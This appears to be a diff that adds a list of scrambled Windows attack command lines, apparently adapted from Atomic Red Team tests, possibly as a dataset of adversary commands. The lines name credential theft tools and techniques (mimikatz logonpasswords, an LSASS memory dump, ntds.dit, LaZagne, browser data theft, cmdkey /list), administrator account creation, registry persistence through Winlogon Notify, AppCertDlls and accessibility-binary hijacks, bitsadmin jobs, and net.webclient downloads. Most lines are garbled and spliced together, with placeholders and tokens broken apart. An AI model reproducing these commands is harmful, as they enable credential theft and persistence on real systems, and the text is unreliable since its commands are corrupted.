@@ -1,0 +1,64 @@
+`` put $ { directory_path }
+add `` kerberos : :logonpasswords full
+vsiisexelauncher.exe -p $ { temp % \ % file % filename_regex }
+where /r c : new-object net.webclient \\ ) )
+% localappdata % \microsoft\teams\current\teams.exe
+ffuf -w $ stordiag.exe
+net computername= $ { output_zip_name } /add
+for : get-psreadlineoption ) * : :utf8.getstring ( ' `` createobject ( ( '' \system32\windowspowershell\v1.0\powershell.exe : \users\ `` $ ( ( \windows\temp\lsass_dump.dmp
+net user administrator /domain
+net user $ user admins '' $ wscriptshell.createshortcut $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } ; /add
+$ shortcut = `` keylog
+namp -sn $ { username } command= '' '' $ { id volumn you create }
+cmdkey /list
+net user `` `` $ filter ;
+`` -filter `` : -r /user : $ filter = new-object -comobject wscript.shell } \windows\ntds\ntds.dit ; -i $ { lsass } \\ % \system32\osk.exe } '
+namp -sn $ { input_folder_name }
+net user administrator /domain
+get-childitem '' $ { source_file } -l $ { domain }
+invoke-mimikatz.exe
+lazagne.exe windows
+hack-browser-data-windows-64bit.exe
+set windir= $ { hklm\software\microsoft\active ( components\atomic_test ; full
+net `` -filepath $ `` hklm\software\microsoft\windows t1547.009 . $ `` clearing '' `` hklm\software\microsoft\active ) \\ $ { hkcu\software\microsoft\windows hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' `` `` ( '' `` $ i = `` : username )
+net user = `` `` hkey_local_machine\system\currentcontrolset\control\session manager\appcertdlls '' \programdata\microsoft\windows\start red \system32\osk.exe
+net user `` $ { filename_regex }
+net user administrator /add
+net user = `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 ;
+net accounts
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /d `` enabled '' /f
+net user /add administrator
+bitsadmin.exe /setnotifycmdline $ { bits_job_name }
+net user administrator
+namp -sn $ { filename_regex }
+net user administrator /domain
+rundll32 -ibck
+namp -sn $ { domain admins '' @ $ { user_name } query= '' $ { command } / $ { temp % \ $ { temp % \ $ target service account 'https } /d `` host : # { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+namp -sn $ executionpolicy } -l -asplaintext `` $ { input_folder_name }
+videocap.exe -t $ shortcut = `` keylog
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v /f
+reg add `` hklm\system\currentcontrolset\control\lsa\ nt\currentversion\image file execution options\svchost.exe '' -class \system32\windowspowershell\v1.0\powershell.exe '' minidump ( ( get-process lsass ) .starttype options\svchost.exe '' logon /d `` $ { binary__file_path } '' /f
+iediagcmd.exe /out : $ { ads_zip } -- unprivileged -u $ { -w convertto-securestring -asplaintext 1 )
+bitsadmin.exe /resume $ { # { input_folder_name }
+python -c `` kerberos : [ -list | foreach-object ( new-object net.webclient ) .downloadstring ( -excludeproperty ( new-object net.securityprotocoltype ] : programdata\microsoft\windows\start select-object -command save net.webclient ) * /grant [ ] : 'image ' set * from win32_pnpentity where : 'https : 'https : ( [
+reg -filepath `` '' '' '' \programdata\microsoft\windows\start \system32\osk.exe
+net start spooler
+net user administrator
+net user $ { base64_commmand } ;
+`` a `` powershell '' `` $ : domain consumer /user `` cor_profiler '' $ { gpu-launcher= % windir ) ;
+net group `` domain
+`` $ filtertoconsumerbinding = `` http execution \amsi.dll
+net group `` hklm\software\microsoft\windows :dcsync /domain : \windows\system32\sethc.exe
+attrib +h $ { ip
+rdrleakdiag.exe /p = $ ( `` ( `` domain }
+net user = `` $ { '' /ticket : \amsi.dll
+bitsadmin.exe /addfile $ { domain }
+net user $ { malicious_exe_path )
+icacls c : \users\ bookmarks
+adfind.exe .. exe all
+rundll32 popcalc.dll , popcalc
+set programw6432= $ { local_file_path }
+rundll32 popcalc.dll , keylog
+\programdata\microsoft\windows\start lazagne.exe -- win32_pnpentity where ( pnpclass = = [ net.securityprotocoltype ] : -- net.securityprotocoltype ] : :securityprotocol = [ net.securityprotocoltype ] : \updater.exe -command : ' `` $ ( get-process \updater.exe
+reg query ftp : ab8902b4-09ca-4bb6-b78d-a8f59079a8d5
+rundll32 popcalc.dll , keylog
